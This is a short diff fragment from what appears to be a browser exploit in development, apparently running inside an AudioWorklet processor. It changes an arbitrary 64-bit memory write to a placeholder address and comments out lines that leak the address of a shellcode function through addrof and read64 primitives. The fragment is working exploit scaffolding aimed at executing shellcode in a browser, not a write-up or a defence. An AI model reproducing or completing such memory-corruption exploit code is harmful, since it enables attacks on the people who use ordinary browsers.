@@ -432,7 +432,7 @@ b.process = (inputs, outputs, parameters)=>{
         },*/
     }
 
-        memory.write(0x414141414141,0x414141414141);
+        memory.write64(0x414141414141,0x5151515151515151515);
         //memory.test();
         
         //var shared_butterfly = floatAsQword(e[1]);
@@ -444,8 +444,8 @@ b.process = (inputs, outputs, parameters)=>{
 
         
         
-        var shellcodeFuncAddr = hex1(memory.addrof(shellcodeFunc));
-        fuck.port.postMessage("[+] Shellcode function @ " + shellcodeFuncAddr >> 5);
+        //var shellcodeFuncAddr = hex1(memory.addrof(shellcodeFunc));
+        //fuck.port.postMessage("[+] Shellcode function @ " + shellcodeFuncAddr >> 5);
         
         //var executableAddr = memory.read64(shellcodeFuncAddr+24); //3*8
         //fuck.port.postMessage("[+] Executable instance @ " + hex1(executableAddr));
